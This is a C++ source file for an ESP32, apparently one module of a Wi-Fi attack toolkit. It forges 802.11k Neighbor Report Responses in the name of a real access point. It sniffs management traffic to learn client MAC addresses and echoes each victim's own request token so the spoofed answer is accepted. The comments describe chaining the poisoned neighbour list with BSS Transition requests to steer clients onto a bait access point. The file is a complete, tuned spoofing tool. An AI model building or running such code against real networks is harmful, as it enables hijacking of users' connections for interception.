// 802.11k Neighbor Report Response spoofing.
//
// Why it is shaped this way:
//   * It is an Action frame: category 5 (Radio Measurement), action 5 (Neighbor
//     Report Response). Category 5 sits inside the robust management set (every
//     action category except Public, HT, the unprotected one, Self-protected, VHT
//     and vendor specific -- Linux _ieee80211_is_robust_mgmt_frame()), so a link
//     that negotiated 802.11w drops an unprotected frame like this in the client's
//     driver. Frame-level only: nothing here claims a PMF bypass.
//   * Addr2 and Addr3 are both the AP BSSID: a client that accepts the frame reads
//     "my AP says these neighbours exist", which is all the steering lever needs.
//   * The report is a list of Neighbor Report elements (id 52, length 13), not a
//     count byte followed by entries. One element is enough for a phantom
//     candidate, and the element length stays at the minimum legal value (no
//     optional subelements).
//   * Requests are unicast (there is no group-addressed Neighbor Report Response)
//     and paced exactly like the BTM module: one frame per client per 300 ms, 50 ms
//     between two injected frames, all of it through tx_guard (45 ms unicast
//     ceiling, first 0x101 restarts).
//   * Field values the standard does not make verifiable for us -- the BSSID
//     Information word, Operating Class, PHY Type -- are parameters whose default
//     is 0 rather than a bit table copied from somewhere. Fill them from a real
//     Neighbor Report Response captured on the bench (lab/cap_frames.py decodes
//     tag 52 and prints the info word as hex) and compare field by field.
//   * Measured: an *unsolicited* response does nothing on an ESP-IDF station --
//     it never even reports WIFI_EVENT_STA_NEIGHBOR_REP (测试报告 §4.4.12). So the
//     useful shape is the answering one: watch for the victim's own Neighbor
//     Report Request (cat 5 act 4), remember its dialog token, and reply with that
//     token inside a short window. A stack that asked for neighbours is far more
//     likely to read the answer than one that never did. `rrmtokhit=` counts how
//     many frames went out carrying a victim's token instead of the fixed one.
//   * The poisoned list then feeds the BTM module: first make the station record
//     our second BSS as a neighbour, then send the BTM Request and let it move.
//     Neither half is enough on its own when the candidate is not scannable.

#include "rrm.h"
#include "baitap.h"
#include "radio.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

#include "deauth.h"
#include "ie_util.h"
#include "tx_guard.h"

namespace {

// A fixed sequence number is thrown away by the station's duplicate detector after
// the first copy, so a repeating spoof must advance it.
uint16_t s_seq;

// Radio Measurement Action field values.
const uint8_t kCategoryRrm = 5;
const uint8_t kActionNbrReportReq = 4;
const uint8_t kActionNbrResponse = 5;

// Neighbor Report element.
const uint8_t kElemNeighborReport = 52;
const uint8_t kNeighborReportLen = 13;

const int kMaxClients = 8;
// Same cadence as the BTM module: one request makes a client look once, the
// repetition is what keeps it looking.
const uint32_t kRepeatMs = 300;
// 20 frames/s is the measured ceiling for unicast management injection (see
// tx_guard.h), so the per-client interval must not be multiplied by the number of
// clients on the air.
const uint32_t kGlobalGapMs = 50;
// 受害者的请求能"认"多久。太长会让回执看起来像在乱猜，太短则一次请求覆盖不到下一轮。
const uint32_t kTokenWindowMs = 5000;

struct client_t {
    uint8_t mac[6];
    uint32_t last_ms;
    uint32_t sent;
};

rrm_mode_t s_mode = RRM_MODE_OFF;
uint8_t s_bssid[6];
uint8_t s_channel;
uint8_t s_cand_bssid[6];
uint8_t s_cand_channel;
uint8_t s_token;
uint32_t s_bssid_info;
uint8_t s_op_class;
uint8_t s_phy_type;
// Frames left in this run; `s_unlimited` is set when the caller asked for a
// continuous run (count = 0).
uint8_t s_left;
bool s_unlimited;
uint32_t s_frames;
uint32_t s_requests;
uint32_t s_responses;
// 受害者最近一次 Neighbor Report Request 的 dialog token，用来应答它自己
uint8_t s_req_mac[6];
uint8_t s_req_token;
uint32_t s_req_ms;
bool s_req_valid;
uint32_t s_token_hits;
client_t s_clients[kMaxClients];
int s_client_count;
uint32_t s_last_tx_ms;

int note_client(const uint8_t* mac) {
    for (int i = 0; i < s_client_count; i++) {
        if (memcmp(s_clients[i].mac, mac, 6) == 0) {
            return i;
        }
    }
    if (memcmp(mac, s_bssid, 6) == 0 || (mac[0] & 0x01) != 0) {
        return -1;  // the AP itself, or a group address
    }
    if (s_client_count >= kMaxClients) {
        return -1;
    }
    client_t* c = &s_clients[s_client_count];
    memset(c, 0, sizeof(*c));
    memcpy(c->mac, mac, 6);
    return s_client_count++;
}

// Neighbor Report Response:
//   24 B header | category(5) | action(5) | dialog token |
//   Neighbor Report element (id 52, len 13): bssid(6) info(4 LE) op_class ch phy
size_t build_nbr_response(uint8_t* frame, const uint8_t sta[6], uint8_t dialog) {
    memset(frame, 0, 64);
    frame[0] = 0xD0;  // management, subtype 13 = action
    frame[1] = 0x00;
    memcpy(frame + 4, sta, 6);
    memcpy(frame + 10, s_bssid, 6);
    memcpy(frame + 16, s_bssid, 6);
    const uint16_t seq = s_seq++ & 0x0FFF;
    frame[22] = (uint8_t)(seq >> 4);
    frame[23] = (uint8_t)((seq & 0x0F) << 4);

    size_t n = 24;
    frame[n++] = kCategoryRrm;
    frame[n++] = kActionNbrResponse;
    frame[n++] = dialog;
    frame[n++] = kElemNeighborReport;
    frame[n++] = kNeighborReportLen;
    memcpy(frame + n, s_cand_bssid, 6);
    n += 6;
    frame[n++] = (uint8_t)(s_bssid_info & 0xFF);
    frame[n++] = (uint8_t)((s_bssid_info >> 8) & 0xFF);
    frame[n++] = (uint8_t)((s_bssid_info >> 16) & 0xFF);
    frame[n++] = (uint8_t)((s_bssid_info >> 24) & 0xFF);
    frame[n++] = s_op_class;
    frame[n++] = s_cand_channel;
    frame[n++] = s_phy_type;
    return n;
}

}  // namespace

bool rrm_start(int index, const uint8_t candidate_bssid[6], uint8_t candidate_channel,
               uint8_t count, uint8_t token, uint32_t bssid_info, uint8_t op_class,
               uint8_t phy_type) {
    const uint8_t* bssid = WiFi.BSSID(index);
    if (bssid == nullptr) {
        return false;
    }
    memcpy(s_bssid, bssid, 6);
    s_channel = WiFi.channel(index);
    memcpy(s_cand_bssid, candidate_bssid, 6);
    s_cand_channel = candidate_channel;
    s_token = token;
    s_bssid_info = bssid_info;
    s_op_class = op_class;
    s_phy_type = phy_type;
    s_unlimited = (count == 0);
    s_left = count;

    s_mode = RRM_MODE_NBR;
    s_client_count = 0;
    s_frames = 0;
    s_requests = 0;
    s_responses = 0;
    s_req_valid = false;
    memset(s_req_mac, 0, 6);
    s_req_token = 0;
    s_req_ms = 0;
    s_token_hits = 0;
    s_last_tx_ms = 0;

    // Skip the retune when the bait AP already sits on this channel: esp_wifi_set_channel
    // restarts the AP's beacon, which would drop a station that just roamed onto it.
    if (!(baitap_running() && baitap_channel() == s_channel)) {
        radio_set_channel("rrm", s_channel);
    }
    // Without the receive callback no station is ever learned and every report
    // would go out blind.
    attack_sniffer_enable();
    return true;
}

void rrm_stop(void) {
    s_mode = RRM_MODE_OFF;
}

void rrm_add_station(const uint8_t mac[6]) {
    note_client(mac);
}

void rrm_step(void) {
    if (s_mode == RRM_MODE_OFF) {
        return;
    }
    if (!s_unlimited && s_left == 0) {
        s_mode = RRM_MODE_OFF;  // the requested burst is done
        return;
    }
    const uint32_t now = millis();
    if (s_last_tx_ms != 0 && now - s_last_tx_ms < kGlobalGapMs) {
        return;
    }
    // One frame per iteration: the short-frame pool is shared with everything else,
    // and a full round of eight clients then costs ~16 ms, far inside the 300 ms
    // repeat interval.
    for (int i = 0; i < s_client_count; i++) {
        client_t* c = &s_clients[i];
        if (c->sent > 0 && now - c->last_ms < kRepeatMs) {
            continue;
        }
        c->last_ms = now;
        // 这个 STA 最近问过邻居吗？问过就用它自己的 token 回，别回一个它没发过的。
        uint8_t dialog = s_token;
        bool echoed = false;
        if (s_req_valid && now - s_req_ms <= kTokenWindowMs &&
            memcmp(c->mac, s_req_mac, 6) == 0) {
            dialog = s_req_token;
            echoed = true;
        }
        uint8_t frame[64];
        const size_t len = build_nbr_response(frame, c->mac, dialog);
        if (tx_guard_send(frame, (uint16_t)len) == ESP_OK) {
            s_frames++;
            if (echoed) {
                s_token_hits++;
            }
            c->sent++;
            s_last_tx_ms = now;
            if (!s_unlimited && s_left > 0) {
                s_left--;
            }
        }
        return;
    }
}

void rrm_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype) {
    if (s_mode == RRM_MODE_OFF || len < 24) {
        return;
    }
    const uint8_t* dest = frame + 4;
    const uint8_t* src = frame + 10;

    if (type == 0 && subtype == 13 && len >= 28 && memcmp(frame + 16, s_bssid, 6) == 0 &&
        frame[24] == kCategoryRrm) {
        // A request from a client proves the client asked the AP for neighbours;
        // a response from the AP is the frame shape we are reproducing.
        if (frame[25] == kActionNbrReportReq) {
            s_requests++;
            // 记下"谁问了、token 是几"，下一步就用它自己这个值回过去
            memcpy(s_req_mac, src, 6);
            s_req_token = frame[26];
            s_req_ms = millis();
            s_req_valid = true;
        } else if (frame[25] == kActionNbrResponse) {
            s_responses++;
        }
    }

    if (type != 0) {
        return;
    }
    // Any management traffic of the BSS is a chance to learn a station MAC.
    if (memcmp(dest, s_bssid, 6) == 0) {
        if (subtype == 0 && len > 28) {
            note_client(src);
            return;
        }
        if (subtype == 2 && len > 34) {
            note_client(src);
            return;
        }
    }
    if (subtype == 4) {  // probe request (usually group-addressed)
        note_client(src);
        return;
    }
    if (memcmp(frame + 16, s_bssid, 6) == 0) {
        note_client(src);
    }
}

void rrm_selftest(void) {
    static const uint8_t placeholder[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    static const uint8_t fake_sta[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
    if (s_bssid[0] == 0 && s_bssid[1] == 0 && s_bssid[2] == 0) {
        memcpy(s_bssid, placeholder, 6);
    }
    if (s_cand_bssid[0] == 0 && s_cand_bssid[1] == 0 && s_cand_bssid[2] == 0) {
        memcpy(s_cand_bssid, placeholder, 6);
        s_cand_bssid[5] = 0x77;
    }
    if (s_cand_channel == 0) {
        s_cand_channel = 6;
    }

    uint8_t frame[64];
    const size_t len = build_nbr_response(frame, fake_sta, s_token);
    const uint32_t info = (uint32_t)frame[35] | ((uint32_t)frame[36] << 8) |
                          ((uint32_t)frame[37] << 16) | ((uint32_t)frame[38] << 24);
    Serial.printf("RRMTEST mode=%s len=%u cat=%u act=%u token=%u protected=%u\n",
                  s_mode == RRM_MODE_NBR ? "nbr" : "off", (unsigned)len, (unsigned)frame[24],
                  (unsigned)frame[25], (unsigned)frame[26],
                  (unsigned)((frame[1] & 0x40) ? 1 : 0));
    Serial.printf("RRMTEST neighbor eid=%u ie_len=%u bssid=", (unsigned)frame[27],
                  (unsigned)frame[28]);
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02X", frame[29 + i]);
    }
    Serial.printf(" info=0x%08X op_class=%u ch=%u phy=%u\n", (unsigned)info, (unsigned)frame[39],
                  (unsigned)frame[40], (unsigned)frame[41]);
    Serial.print("RRMTEST hex=");
    for (size_t i = 0; i < len; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();
}

bool rrm_active(void) {
    return s_mode != RRM_MODE_OFF;
}

const char* rrm_mode_name(void) {
    return s_mode == RRM_MODE_NBR ? "nbr" : "off";
}

uint32_t rrm_frames(void) {
    return s_frames;
}

uint32_t rrm_clients(void) {
    return (uint32_t)s_client_count;
}

uint8_t rrm_remaining(void) {
    return s_unlimited ? 0 : s_left;
}

uint32_t rrm_requests(void) {
    return s_requests;
}

uint32_t rrm_token_hits(void) {
    return s_token_hits;
}

uint32_t rrm_responses(void) {
    return s_responses;
}

uint8_t rrm_candidate_channel(void) {
    return s_cand_channel;
}

uint8_t rrm_token(void) {
    return s_token;
}

uint32_t rrm_bssid_info(void) {
    return s_bssid_info;
}

uint8_t rrm_op_class(void) {
    return s_op_class;
}

uint8_t rrm_phy_type(void) {
    return s_phy_type;
}
